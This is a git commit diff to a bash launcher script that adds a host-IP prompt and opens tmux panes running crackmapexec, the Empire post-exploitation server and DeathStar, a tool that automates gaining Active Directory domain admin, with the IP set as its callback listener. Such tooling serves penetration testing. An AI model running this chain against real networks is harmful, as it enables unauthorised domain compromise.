482c33e309fec3d7ba79e82ceeb91b3c69f85f0b
joethorpe6 <joethorpe6@openmailbox.org>
2017-10-11 22:58:01 +0100

    ask for Host ip in DeathStar

--- InstantDomainAdmin/launcher.sh
+++ InstantDomainAdmin/launcher.sh
@@ -1,4 +1,9 @@
 #!/bin/bash
+HOSTIP=$1
+if  [[ -z "$HOSTIP" ]]; then
+    echo -e "\n"
+    read -p "Host IP (192.168.1.20): " HOSTIP
+fi
 tmux new-session -d -s instantdomainadmin ;
 tmux send-keys -t instantdomainadmin "crackmapexec | less "  C-m
 tmux new-window \;
@@ -6,5 +11,5 @@ tmux split-window -h ;
 tmux select-pane -L
 tmux send-keys -t instantdomainadmin "cd /opt/Empire && ./empire --rest --username username --password password" C-m
 tmux select-pane -R
-tmux send-keys -t instantdomainadmin "sleep 10 && cd /opt/DeathStar && python3 ./DeathStar.py -u username -p password "  C-m
+tmux send-keys -t instantdomainadmin "sleep 10 && cd /opt/DeathStar && python3 ./DeathStar.py -u username -p password -lip $HOSTIP"  C-m
 tmux attach-session -d -t instantdomainadmin
